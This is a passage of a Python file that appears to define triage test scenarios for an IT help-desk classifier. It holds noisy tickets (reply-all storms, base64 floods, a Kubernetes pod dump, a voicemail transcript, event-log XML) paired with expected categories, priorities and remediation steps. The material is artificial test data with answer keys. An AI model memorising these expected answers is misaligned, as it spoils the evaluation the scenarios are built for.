                "ISSUE 1 — MONITOR FLICKERING:\n"
                "My external monitor (Dell U2723QE, connected via USB-C) has been "
                "flickering intermittently since Monday. It flickers every 10-15 "
                "minutes for about 5 seconds, then stabilizes. I've tried a "
                "different USB-C cable and a different port on my laptop (ThinkPad "
                "X1 Carbon Gen 11) but the problem persists.\n\n"
                "--- interleaved reply from different thread ---\n"
                "From: Nina Johansson <nina.johansson@contoso.com>\n"
                "Sent: Wednesday, March 19, 2026 4:45 PM\n"
                "To: Software Licensing <licensing@contoso.com>\n\n"
                "Hi Licensing team, my Adobe Creative Cloud subscription shows "
                "'License expired' when I open Photoshop and Illustrator. My "
                "manager approved the renewal last week (approval ref: LIC-2026-"
                "0342). Can someone re-activate my license? My Adobe ID is "
                "nina.johansson@contoso.com.\n\n"
                "--- back to monitor thread ---\n"
                "From: IT Support <itsupport@contoso.com>\n"
                "Sent: Tuesday, March 19, 2026 11:00 AM\n\n"
                "Hi Nina, can you confirm if the flickering happens with the "
                "laptop lid closed (external only) or also with dual-display?\n\n"
                "--- back to licensing thread ---\n"
                "From: Software Licensing <licensing@contoso.com>\n"
                "Sent: Wednesday, March 19, 2026 2:30 PM\n\n"
                "Hi Nina, we can see approval LIC-2026-0342. Processing now, "
                "should be active within 24 hours.\n\n"
                "--- Nina's combined reply ---\n"
                "The flickering happens in both modes — lid open and lid closed. "
                "And thanks for the license update, I'll check Photoshop again "
                "tomorrow."
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Separate and triage two interleaved issues from Nina Johansson. "
                "Issue 1 (hardware): Dell U2723QE external monitor flickering via "
                "USB-C on a ThinkPad X1 Carbon Gen 11 — persists across cables, "
                "ports, and display modes. Issue 2 (software licensing): Adobe "
                "Creative Cloud license renewal is already being processed (ref "
                "LIC-2026-0342). Focus triage on the monitor flickering issue."
            ),
            remediation_steps=[
                "Test the Dell U2723QE with a different laptop to isolate whether "
                "the issue is the monitor or the ThinkPad's USB-C/Thunderbolt port.",
                "Update the ThinkPad X1 Carbon Gen 11 Intel graphics and Thunderbolt "
                "firmware — USB-C display flickering is a known issue with older "
                "Thunderbolt drivers.",
                "Check the Dell U2723QE firmware version and update via Dell Display "
                "Manager if a newer version is available.",
                "Try connecting via DisplayPort or HDMI (with an adapter) to rule out "
                "USB-C/Thunderbolt protocol negotiation issues.",
                "For the Adobe license issue, confirm with the licensing team that "
                "approval LIC-2026-0342 has been fully processed and no further "
                "action is needed on IT's side.",
            ],
            reporter_name="Nina Johansson",
            reporter_email="nina.johansson@contoso.com",
            reporter_department="Frontend Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "interleaved-threads"],
            difficulty="hard",
        ),
        # ── DC-171  Extremely long email with 50+ reply-all participants ──
        ScenarioDefinition(
            scenario_id="DC-171",
            subject="RE: RE: RE: RE: RE: RE: ALL: Building access badges not working after security system upgrade",
            description=(
                "From: David Chen <david.chen@contoso.com>\n"
                "Sent: Monday, March 24, 2026 7:12 AM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "CC: facilities@contoso.com; security-ops@contoso.com; "
                "floor-3-all@contoso.com; floor-4-all@contoso.com; "
                "building-mgmt@contoso.com; hr-ops@contoso.com; "
                "exec-assistants@contoso.com; reception-team@contoso.com; "
                "visitor-mgmt@contoso.com; parking-ops@contoso.com; "
                "cafeteria-staff@contoso.com; janitorial@contoso.com; "
                "mailroom@contoso.com; shipping@contoso.com; "
                "conference-rooms@contoso.com; av-team@contoso.com; "
                "print-services@contoso.com; hvac-ops@contoso.com; "
                "electrical@contoso.com; plumbing@contoso.com; "
                "landscaping@contoso.com; safety-committee@contoso.com; "
                "fire-marshal@contoso.com; elevator-maint@contoso.com; "
                "telecom@contoso.com; network-ops@contoso.com; "
                "datacenter-ops@contoso.com; cloud-infra@contoso.com; "
                "devops@contoso.com; sre-team@contoso.com; "
                "platform-eng@contoso.com; security-team@contoso.com; "
                "compliance@contoso.com; legal@contoso.com; "
                "finance-ops@contoso.com; procurement@contoso.com; "
                "vendor-mgmt@contoso.com; training@contoso.com; "
                "wellness@contoso.com; diversity@contoso.com; "
                "sustainability@contoso.com; innovation-lab@contoso.com; "
                "research@contoso.com; analytics@contoso.com; "
                "marketing-ops@contoso.com; sales-ops@contoso.com; "
                "customer-success@contoso.com; partner-team@contoso.com\n\n"
                "Hi everyone,\n\n"
                "Adding more people to this thread in case anyone else is "
                "affected. My badge still does not work on Floor 3 after the "
                "weekend security system upgrade. I get a red light and three "
                "beeps when I tap it. I have tried the main entrance, the side "
                "door, and the parking garage — none work.\n\n"
                "--- 47 reply-all messages below ---\n"
                "From: Janet Wu <janet.wu@contoso.com>\n"
                "Same problem on Floor 4.\n\n"
                "From: Mike Torres <mike.torres@contoso.com>\n"
                "Me too. Also Floor 3. This is ridiculous.\n\n"
                "From: Linda Park <linda.park@contoso.com>\n"
                "My badge works fine on Floor 2. Maybe it's only Floors 3 and 4?\n\n"
                "From: Bob Anderson <bob.anderson@contoso.com>\n"
                "Can someone please remove me from this thread?\n\n"
                "From: Sarah Kim <sarah.kim@contoso.com>\n"
                "Please stop replying all!\n\n"
                "From: Tom Nguyen <tom.nguyen@contoso.com>\n"
                "+1 on the badge issue. Floor 3 server room badge also fails.\n\n"
                "From: Amy Patel <amy.patel@contoso.com>\n"
                "Has anyone tried re-registering their badge at the security desk?\n\n"
                "From: Carlos Mendez <carlos.mendez@contoso.com>\n"
                "Yes, I went to security. They said their system shows my badge "
                "as valid but the door readers on 3 and 4 are not synced.\n\n"
                "From: Priya Sharma <priya.sharma@contoso.com>\n"
                "Facilities confirmed the badge reader firmware was updated but "
                "the certificate exchange with the central auth server failed "
                "during the weekend maintenance window.\n\n"
                "[... 38 more reply-all messages with unsubscribe requests, "
                "me-too responses, vacation auto-replies, and off-topic "
                "conversations about the cafeteria menu ...]"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Extract the core issue from a massive reply-all storm: badge "
                "readers on Floors 3 and 4 are not authenticating after a "
                "weekend security system upgrade. The root cause (per Priya "
                "Sharma's reply) is a failed certificate exchange between the "
                "door reader firmware and the central authentication server. "
                "Ignore the 47 reply-all noise messages."
            ),
            remediation_steps=[
                "Contact the facilities security team to re-initiate the "
                "certificate exchange between the updated badge reader firmware "
                "and the central authentication server.",
                "Verify the Floors 3 and 4 badge readers are reaching the auth "
                "server — check network connectivity and firewall rules for the "
                "reader VLAN.",
                "If the certificate exchange cannot be completed immediately, "
                "roll back the badge reader firmware to the previous version to "
                "restore access.",
                "Send a targeted communication to Floors 3 and 4 occupants with "
                "a status update and expected resolution time to prevent further "
                "reply-all storms.",
                "Set up a temporary manual sign-in process at affected entrances until badge readers are operational.",
            ],
            reporter_name="David Chen",
            reporter_email="david.chen@contoso.com",
            reporter_department="Platform Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "reply-all-storm", "massive-cc-list", "very-long-email"],
            difficulty="hard",
        ),
        # ── DC-172  Base64-encoded screenshot flood in email body ──
        ScenarioDefinition(
            scenario_id="DC-172",
            subject="Screenshots of Excel crash — URGENT",
            description=(
                "Hi IT,\n\n"
                "Excel keeps crashing when I open our Q1 revenue model. I have "
                "pasted the screenshots directly into this email.\n\n"
                "Screenshot 1 (crash dialog):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABkAAAASwCAYAAAB"
                "k5LzFAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOwgAADsIBFShKgAAAABl0"
                "RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4xMkMEa+wAACAASURBVHic7N0H"
                "fFTV2cfx/0x6Qg29Se9FUERRQUXs2MWuqNi7rl1XsYsNe1fsvSuiooiCIiI"
                "gvffeQnrvvO8zd0ICJCQhIT/v53PvzNy5c+ecM5NM5jfnnNnFxcVqR5KkHU"
                "EG+RdddJH69a9/rf79+ys2NlZRUVGhJkl7bIuJiVF+fr4iIyMVHh6u3Nxc"
                "JSUl6YcfftD111+vX375JdTshx0L3gdP9k0fN/a7K+rTZ8tP7ty5U+np6U"
                "pOTi6+1cfb27dv1/bt25Wdna2kpCStXLlSc+bM0cSJE0NJrLYuKiraxoUL"
                "F+pf//qXLr/8cvXp00fnnHOOjj76aHXr1k1du3ZVly5d1LlzZ3Xq1Ekd//"
                "/v/v/3u3fvrp49e6pXr17q06ePDjnkEB155JE67rjjdNJJJ+nUU0/VWWed"
                "pfPPP18XXXSRhgwZoquvvlo33XSTbr75Zt1yyy269dZbdfvtt+vOO+/U3Xf"
                "frfvuu08PPvig/vWvf+mJJ57Q008/rWeffVbPP/+8XnzxRb388st65ZVX9N"
                "prr+mNN97QW2+9pbffflvvvvuuPvjgA3388cf69NNP9fnnn+vLL7/UV199p"
                "W+++UbfffedRo0apZ9++kk///yzfvnlF40bN04TJkzQlClTNH36dM2aNUtz"
                "587VwoULtXjxYi1dulTLly/XypUrtWbNGq1bt04bNmzQ5s2btW3bNm3fvl0"
                "7d+5Uamqq0tLSlJGRoezsbOXm5qqgoEDFxcWhx6BWuweKiurWoHc5fxlbWl"
                "qqNm7cqLlz52rixIkaPXq0Pv30U73xxht64YUX9K9//UuPPPKIHnjgAd17"
                "772666679MQTT+jyyy/XiBEjdMwxxzjcRx99tAYOHKijjjpKRx55pA477DD"
                "179+f4e7bt6969uypbt26qVOnTurYsaM6dOig9u3bq23btmrVqpVatmyp5s"
                "2bq2nTpmrSpIkaN26shg0bqn79+qpXr55q164t47l58+YqKCgINR0dHS0rK"
                "w8PV1hYmEJCQhQeHq5ffvlFjz76qI455hj17t1b3bt3V9euXdW5c2d16tRJ"
                "HTt2VIcOHdS+fXu1a9dObdq0UevWrdWqVSu1bNlSLVq0UPPmzdW0aVM1ad"
                "JEjRo1UsOGDdWgQQPVq1dP8fHxio2NVUxMjKKjoxUVFaXIyEhFREQoPDx"
                "\n\n"
                "Screenshot 2 (error details):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABLAAAAMgCAYAAA"
                "B9FSwuAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOwgAADsIBFShKgAAAABl"
                "0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4xMkMEa+wAACAASURBVHic7N"
                "0HeFTV2cfx35maTXrvkNC79N57FUQUe++99967YK+IqIi9dywoKCIiIIqCi"
                "Fz587duYkISS9AOSWZ5P7nTJKBIE18P8+TuXPuvefec8/cmcm88567dOnS"
                "KigocO7cuf3799f48eMVFRWlkJAQLVu2TJmZmcrMzFR2drZycnKUl5en/"
                "Px8FRYWyuPxKCkpSSkpKUpLS1NGRoaysrKUk5Oj3Nxc5efnq6CgQIWF"
                "hfJ4PMrPz1d2draysrKUmZmpjIwMpaenKy0tTampqUpJSVFycrKSkpK0"
                "c+dOJSYmaseOHdq+fbu2bt2qLVu2aNOmTdqwYYPWrVuntWvXas2aNVq1"
                "apVWrlyplStXasWKFVq+fLmWLVumJUuWaPHixVq0aJEWLlyo+fPna968"
                "eZo7d65mz56tWbNmaebMmZo+fbqmTZumqVOnasqUKZo8ebImTZqkiRMn"
                "asKECRo/frzGjRuncePG6ddff9Uvv/yin3/+WT/99JN++OEHjR07Vt9//"
                "71Gjx6t0aNHa9SoUfrmm2/09ddf68svv9Tnn3+uzz77TJ988ok++ugj"
                "vf/++3rvvff07rvv6p133tHbb7+tt956S2+++abeeOMNvf7663rttdf0"
                "6quvavjw4XrllVf00ksv6cUXX9QLL7yg5557Ts8++6yeeeYZPf300/rX"
                "v/6lJ598Uk888YT++c9/6rHHHtPDDz+shx56SA8++KDuv/9+3XffffrH"
                "P/6he+65R3fffbfuuusu3X777brtttt0yy236KabbtINN9yga6+9Vtdc"
                "c42uuuoqXXnllbr88st16aWX6uKLL9aFF16o888/X+eee67OOeccnX32"
                "2TrrrLM0ePBgnXHGGTr99NM1aNAgnXrqqTrllFN00kkn6fjjj9exxx6r"
                "Y445RkcddZQGDBig/v37q1+/furTp4969eqlHj16qHv37urWrZu6du2q"
                "Ll26qHPnzurUqZM6duyo9u3bq127dmrbtq1at26tVq1aqUWLFmrevLma"
                "NWumJk2aqHHjxmrUqJEaNGighg0bKi4uTnFxcYqJiVFMTIyio6MVFRWl"
                "\n\n"
                "Screenshot 3 (task manager):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA8AAAAMgCAYAAA"
                "DPCz+xAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOwgAADsIBFShKgAAAAB"
                "l0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4xMkMEa+wAACAASURBVHic"
                "7N0HfFTV+cfx30xm0nvSSxJ679179y6IKIoKKvYu7r2touLeC6IioigqIiI"
                "gIoqCiIqCINLkz527cyeZEBJSgH+e58nce++59545c2cmk9+85y5fvlxBQY"
                "HOnz+/X79+Gj9+vKKiouT3+7Vs2TJlZGQoIyND2dnZysnJUV5envLz81V"
                "YWKiioiJ5PB4lJycrNTVV6enpysjIUFZWlnJycpSbm6v8/HwVFBSosLBQ"
                "\n\n"
                "Screenshot 4 (system info):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAACDAAAAMgCAYAAA"
                "B+FjaaAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOwgAADsIBFShKgAAAAB"
                "l0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4xMkMEa+wAACAASURBVHic"
                "7d0HfFTV+f/x79mZNBJSgFBCL733roh7L4goioqKqKjYe+u6do27K6IoKiI"
                "iIiIiIqIoiKIgiv7MnTt3ZjIhJKQAKf7/zz33zpkkIYmJQP55nic599xz"
                "\n\n"
                "Screenshot 5 (event viewer):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABQAAAAMgCAYAAA"
                "C1fRaaAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOwgAADsIBFShKgAAAAB"
                "l0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMC4xMkMEa+wAACAASURBVHic"
                "7d0HfNXV/f/x97kryWYTIISE3nvvvYsoioqKoqKiolu7drW7drW2dmkXd1V"
                "EUUREBEREBEFERET/5s6d+ycJSSkhIP/P8zzJvffeO+495557k3uT97nnni"
                "\n\n"
                "Please help, I need this fixed by end of day for the board "
                "presentation.\n\n"
                "Regards,\nAisha Patel\nFinance"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Triage the Excel crash report despite five large base64-encoded "
                "image payloads embedded directly in the email body. The actual "
                "issue is that Excel crashes when opening the Q1 revenue model "
                "file. Request the Excel version, the exact error message from "
                "the crash dialog, and the file size of the workbook."
            ),
            remediation_steps=[
                "Request the Excel version number (File > Account) and whether "
                "the user is on Microsoft 365 desktop or Office 2021.",
                "Ask for the exact error code or message from the crash dialog "
                "(the base64 screenshots are not viewable in a text triage).",
                "Check if the Q1 revenue model workbook uses complex macros, "
                "Power Query connections, or volatile functions that could cause "
                "memory exhaustion.",
                "Try opening the workbook in Excel Safe Mode (hold Ctrl while launching) to rule out add-in conflicts.",
                "If the file is very large (>100 MB), suggest splitting it into "
                "linked workbooks or migrating heavy calculations to Power BI.",
            ],
            reporter_name="Aisha Patel",
            reporter_email="aisha.patel@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64-flood", "image-heavy", "inline-image"],
            difficulty="hard",
        ),
        # ── DC-173  Email with embedded SVG containing JavaScript ──
        ScenarioDefinition(
            scenario_id="DC-173",
            subject="Dashboard widget rendering broken — see inline SVG",
            description=(
                "Hi IT Support,\n\n"
                "Our internal analytics dashboard (https://dashboard.contoso.com) "
                "is rendering the KPI widgets incorrectly. The SVG charts are "
                "showing raw markup instead of the visual. Here is the SVG source "
                "from the page:\n\n"
                '<svg xmlns="http://www.w3.org/2000/svg" width="800" height="400"'
                ' viewBox="0 0 800 400">\n'
                "  <style>\n"
                "    .axis { stroke: #333; stroke-width: 1; }\n"
                "    .bar { fill: #0078d4; transition: fill 0.3s; }\n"
                "    .bar:hover { fill: #005a9e; }\n"
                '    .label { font-family: "Segoe UI", sans-serif; font-size:'
                " 12px; fill: #666; }\n"
                "  </style>\n"
                "  <defs>\n"
                '    <linearGradient id="grad1" x1="0%" y1="0%" x2="0%" y2='
                '"100%">\n'
                '      <stop offset="0%" style="stop-color:#0078d4;stop-opacity'
                ':1" />\n'
                '      <stop offset="100%" style="stop-color:#005a9e;stop-opacity'
                ':1" />\n'
                "    </linearGradient>\n"
                "  </defs>\n"
                '  <line class="axis" x1="50" y1="10" x2="50" y2="350" />\n'
                '  <line class="axis" x1="50" y1="350" x2="780" y2="350" />\n'
                '  <rect class="bar" x="80" y="120" width="60" height="230"'
                ' fill="url(#grad1)" />\n'
                '  <rect class="bar" x="160" y="80" width="60" height="270"'
                ' fill="url(#grad1)" />\n'
                '  <rect class="bar" x="240" y="200" width="60" height="150"'
                ' fill="url(#grad1)" />\n'
                '  <rect class="bar" x="320" y="50" width="60" height="300"'
                ' fill="url(#grad1)" />\n'
                '  <text class="label" x="95" y="370">Q1</text>\n'
                '  <text class="label" x="175" y="370">Q2</text>\n'
                '  <text class="label" x="255" y="370">Q3</text>\n'
                '  <text class="label" x="335" y="370">Q4</text>\n'
                '  <text class="label" x="10" y="125" transform="rotate(-90,'
                '10,125)">Revenue ($M)</text>\n'
                "</svg>\n\n"
                "This used to render fine last week. We updated the dashboard "
                "framework to React 19 on Friday and the SVG rendering broke "
                "on Monday morning.\n\n"
                "Browser: Edge 124.0.2478.80\n"
                "OS: Windows 11 23H2\n\n"
                "Thanks,\nRajesh Kumar\nBusiness Intelligence"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Triage the dashboard rendering issue despite the inline SVG "
                "markup noise. The real issue is that KPI chart widgets on "
                "dashboard.contoso.com stopped rendering after a React 19 "
                "upgrade last Friday. The SVG source is diagnostic context, "
                "not the problem itself."
            ),
            remediation_steps=[
                "Check whether the React 19 upgrade changed the SVG rendering "
                "pipeline — React 19 has stricter namespace handling for SVG "
                "elements that can break inline SVG in JSX.",
                "Verify the dashboard framework version and check its changelog "
                "for breaking changes related to SVG or HTML rendering.",
                "Test the dashboard in Chrome and Firefox to determine if the "
                "issue is Edge-specific or framework-wide.",
                "Roll back the React version to the last known working build as "
                "an interim fix while the SVG rendering issue is investigated.",
                "Review the dashboard's Content Security Policy headers — CSP "
                "changes during the upgrade may block inline styles in SVGs.",
            ],
            reporter_name="Rajesh Kumar",
            reporter_email="rajesh.kumar@contoso.com",
            reporter_department="Business Intelligence",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "svg-inline", "html-noise", "code-paste"],
            difficulty="medium",
        ),
        # ── DC-174  Ticket body is entirely a Kubernetes describe dump ──
        ScenarioDefinition(
            scenario_id="DC-174",
            subject="Pod CrashLoopBackOff — payment-service",
            description=(
                "Name:         payment-service-7b9f8c6d4-x2kq9\n"
                "Namespace:    prod-payments\n"
                "Priority:     0\n"
                "Node:         aks-nodepool1-38274610-vmss000004\n"
                "Start Time:   Mon, 24 Mar 2026 03:14:22 +0000\n"
                "Labels:       app=payment-service\n"
                "              chart=payment-service-2.4.1\n"
                "              heritage=Helm\n"
                "              pod-template-hash=7b9f8c6d4\n"
                "              release=prod-payments\n"
                "              version=2.4.1\n"
                "Annotations:  kubernetes.io/psp: restricted\n"
                "              prometheus.io/port: 8080\n"
                "              prometheus.io/scrape: true\n"
                "Status:       Running\n"
                "IP:           10.244.3.47\n"
                "IPs:\n"
                "  IP:           10.244.3.47\n"
                "Controlled By:  ReplicaSet/payment-service-7b9f8c6d4\n"
                "Containers:\n"
                "  payment-service:\n"
                "    Container ID:   containerd://a8f3e2d1c0b9...\n"
                "    Image:          contoso.azurecr.io/payment-service:2.4.1\n"
                "    Image ID:       contoso.azurecr.io/payment-service@sha256:"
                "9a8b7c6d5e4f...\n"
                "    Port:           8080/TCP\n"
                "    Host Port:      0/TCP\n"
                "    State:          Waiting\n"
                "      Reason:       CrashLoopBackOff\n"
                "    Last State:     Terminated\n"
                "      Reason:       OOMKilled\n"
                "      Exit Code:    137\n"
                "    Ready:          False\n"
                "    Restart Count:  47\n"
                "    Limits:\n"
                "      cpu:     500m\n"
                "      memory:  256Mi\n"
                "    Requests:\n"
                "      cpu:     100m\n"
                "      memory:  128Mi\n"
                "    Liveness:   http-get http://:8080/healthz "
                "delay=30s timeout=5s period=10s #success=1 #failure=3\n"
                "    Readiness:  http-get http://:8080/readyz "
                "delay=5s timeout=3s period=5s #success=1 #failure=3\n"
                "    Environment:\n"
                "      DB_HOST:              <set to the key 'host' in secret "
                "'payment-db-creds'>  Optional: false\n"
                "      DB_PORT:              5432\n"
                "      DB_NAME:              payments_prod\n"
                "      REDIS_URL:            redis://redis-master.prod-cache."
                "svc.cluster.local:6379\n"
                "      LOG_LEVEL:            info\n"
                "      JAVA_OPTS:            -Xms128m -Xmx256m\n"
                "    Mounts:\n"
                "      /var/run/secrets/kubernetes.io/serviceaccount from "
                "kube-api-access-x7k2m (ro)\n"
                "Conditions:\n"
                "  Type              Status\n"
                "  Initialized       True\n"
                "  Ready             False\n"
                "  ContainersReady   False\n"
                "  PodScheduled      True\n"
                "Events:\n"
                "  Type     Reason     Age                 From               "
                "Message\n"
                "  ----     ------     ----                ----               "
                "-------\n"
                "  Normal   Scheduled  52m                 default-scheduler  "
                "Successfully assigned prod-payments/payment-service-7b9f8c6d4"
                "-x2kq9 to aks-nodepool1-38274610-vmss000004\n"
                "  Normal   Pulling    51m                 kubelet            "
                "Pulling image contoso.azurecr.io/payment-service:2.4.1\n"
                "  Normal   Pulled     51m                 kubelet            "
                "Successfully pulled image\n"
                "  Normal   Created    47m (x48 over 51m)  kubelet            "
                "Created container payment-service\n"
                "  Normal   Started    47m (x48 over 51m)  kubelet            "
                "Started container payment-service\n"
                "  Warning  BackOff    2m (x210 over 50m)  kubelet            "
                "Back-off restarting failed container\n"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "The entire ticket body is a raw 'kubectl describe pod' dump "
                "with no human summary. Extract the key facts: the "
                "payment-service pod in prod-payments namespace is in "
                "CrashLoopBackOff due to OOMKilled (exit code 137) after 47 "
                "restarts. Memory limit is 256Mi with JAVA_OPTS -Xmx256m — "
                "the JVM heap equals the container limit, leaving no room for "
                "non-heap memory. This is a P1 production outage."
            ),
            remediation_steps=[
                "Increase the container memory limit to at least 512Mi (or "
                "better, 768Mi) since the JVM needs headroom above -Xmx for "
                "metaspace, thread stacks, and native memory.",
                "Adjust JAVA_OPTS to -Xms256m -Xmx384m to give the JVM proper "
                "heap space while leaving room within the container limit.",
                "Check if the payment-service 2.4.1 release introduced a memory "
                "leak — compare heap usage patterns with the previous version.",
                "Review recent traffic patterns to determine if a load spike "
                "caused the OOM or if it occurs under normal load.",
                "Set up a JVM heap dump on OOM (-XX:+HeapDumpOnOutOfMemoryError) "
                "and configure a persistent volume for the dump file.",
            ],
            reporter_name="Ops Monitoring Bot",
            reporter_email="ops-alerts@contoso.com",
            reporter_department="Site Reliability Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "k8s-describe", "machine-generated", "no-details"],
            difficulty="hard",
        ),
        # ── DC-175  Voicemail transcription with speech-to-text errors ──
        ScenarioDefinition(
            scenario_id="DC-175",
            subject="Voicemail from ext 4471 — transcribed",
            description=(
                "[Auto-transcribed voicemail — confidence: 62%]\n"
                "[Duration: 2:14 | Received: 2026-03-24 08:47 EST]\n\n"
                "Hey this is uh Marcus from the trading floor um so we have "
                "a situation with the new broom bird terminal... no wait "
                "Bloomberg terminal [laughs] sorry the speech thing... anyway "
                "the bloom berg terminal on desk seven teen is showing stale "
                "praises... prices for the fix income dashboard. It's been "
                "stuck since about six thirty this moaning... morning and "
                "the traders are going bal istic because they can't see real "
                "time bond yields. We tried rebooting the terminal but it "
                "just shows the same stale data from like mid night. The "
                "other terminals on the floor seem fine, it's just desk "
                "seven teen. Can someone come take a look? This is pretty "
                "urgent because we have a big sov reign... sovereign bond "
                "auction at ten AM and the traders need live pricing. My "
                "extension is four four seven one and my cell is [REDACTED]. "
                "Thanks.\n\n"
                "[End of transcription]\n"
                "[Original audio: voicemail_20260324_084700_ext4471.wav — "
                "attached to ticket as .wav file, 3.2 MB]"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Parse through the noisy speech-to-text transcription to "
                "extract the real issue: the Bloomberg terminal on desk 17 "
                "of the trading floor is showing stale fixed-income prices "
                "since approximately 06:30 AM. Only desk 17 is affected. "
                "This is urgent due to a sovereign bond auction at 10 AM. "
                "Rebooting did not resolve the issue."
            ),
            remediation_steps=[
                "Check the Bloomberg B-PIPE data feed connection for desk 17's "
                "terminal — the stale data suggests a feed subscription or "
                "network issue specific to that workstation.",
                "Verify the network connection on desk 17 — check for packet "
                "loss or latency on the dedicated market data VLAN.",
                "Compare the terminal configuration on desk 17 with a working "
                "terminal to identify any differences in data subscriptions or "
                "pricing sources.",
                "Contact Bloomberg support with the terminal serial number to "
                "check for any known service disruptions on the fixed-income "
                "feed.",
                "As a workaround, move the trader to a spare terminal or hot "
                "desk before the 10 AM sovereign bond auction.",
            ],
            reporter_name="Marcus Rivera",
            reporter_email="marcus.rivera@contoso.com",
            reporter_department="Fixed Income Trading",
            channel=Channel.PHONE,
            tags=["data-cleanup", "voicemail", "speech-to-text", "transcription-errors", "bloomberg"],
            difficulty="hard",
        ),
        # ── DC-176  Email with massive Windows Event Log XML dump ──
        ScenarioDefinition(
            scenario_id="DC-176",
            subject="Server keeps blue-screening — event logs attached inline",
            description=(
                "Hi IT team,\n\n"
                "Server YOURAPP-SQL-03 has blue-screened 4 times today. I exported "
                "the relevant event log entries below.\n\n"
                "<Events>\n"
                "  <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/"
                "event'>\n"
                "    <System>\n"
                "      <Provider Name='Microsoft-Windows-WER-SystemErrorReporting'"
                " Guid='{ABCE23E7-DE45-4366-8631-84FA6C525952}'/>\n"
                "      <EventID>1001</EventID>\n"
                "      <Version>0</Version>\n"
                "      <Level>2</Level>\n"
                "      <Task>0</Task>\n"
                "      <Opcode>0</Opcode>\n"
                "      <Keywords>0x80000000000000</Keywords>\n"
                "      <TimeCreated SystemTime='2026-03-24T06:14:22.0000000Z'/>\n"
                "      <EventRecordID>784521</EventRecordID>\n"
                "      <Correlation/>\n"
                "      <Execution ProcessID='0' ThreadID='0'/>\n"
                "      <Channel>System</Channel>\n"
                "      <Computer>YOURAPP-SQL-03.contoso.local</Computer>\n"
                "      <Security/>\n"
                "    </System>\n"
                "    <EventData>\n"
                "      <Data Name='param1'>0x000000d1 "
                "(DRIVER_IRQL_NOT_LESS_OR_EQUAL)</Data>\n"
                "      <Data Name='param2'>fffff80e`4a2c1000</Data>\n"
                "      <Data Name='param3'>storport.sys</Data>\n"
                "      <Data Name='param4'>6.3.9600.21924</Data>\n"
                "      <Data Name='param5'>C:\\Windows\\MEMORY.DMP</Data>\n"
                "    </EventData>\n"
                "  </Event>\n"
                "  <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/"
                "event'>\n"
                "    <System>\n"
                "      <Provider Name='Microsoft-Windows-WER-SystemErrorReporting'"
                " Guid='{ABCE23E7-DE45-4366-8631-84FA6C525952}'/>\n"
                "      <EventID>1001</EventID>\n"
                "      <Version>0</Version>\n"
                "      <Level>2</Level>\n"
                "      <Task>0</Task>\n"
                "      <TimeCreated SystemTime='2026-03-24T09:22:15.0000000Z'/>\n"
                "      <EventRecordID>784522</EventRecordID>\n"
                "      <Channel>System</Channel>\n"
                "      <Computer>YOURAPP-SQL-03.contoso.local</Computer>\n"
                "    </System>\n"
                "    <EventData>\n"
                "      <Data Name='param1'>0x000000d1 "
                "(DRIVER_IRQL_NOT_LESS_OR_EQUAL)</Data>\n"
                "      <Data Name='param2'>fffff80e`4a2c1000</Data>\n"
                "      <Data Name='param3'>storport.sys</Data>\n"
                "      <Data Name='param4'>6.3.9600.21924</Data>\n"
                "      <Data Name='param5'>C:\\Windows\\MEMORY.DMP</Data>\n"
                "    </EventData>\n"
                "  </Event>\n"
                "[... 47 more similar Event entries spanning 6 hours ...]\n"
                "</Events>\n\n"
                "This is a production SQL Server so downtime is critical.\n\n"
                "Thanks,\nKevin O'Brien\nDatabase Administration"
            ),
            category=Category.HARDWARE,
            priority=Priority.P1,
            team=Team.ENDPOINT,
            needs_escalation=True,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Extract the critical signal from the verbose Windows Event Log "
                "XML dump: server YOURAPP-SQL-03 is repeatedly blue-screening "
                "with DRIVER_IRQL_NOT_LESS_OR_EQUAL (0xD1) caused by "
                "storport.sys v6.3.9600.21924. This is a storage driver issue "
                "on a production SQL Server. Four crashes in one day with 47 "
                "event log entries of the same pattern."
            ),
            remediation_steps=[
                "Update the storport.sys driver to the latest version — the "
                "current version 6.3.9600.21924 has a known IRQL bug when "
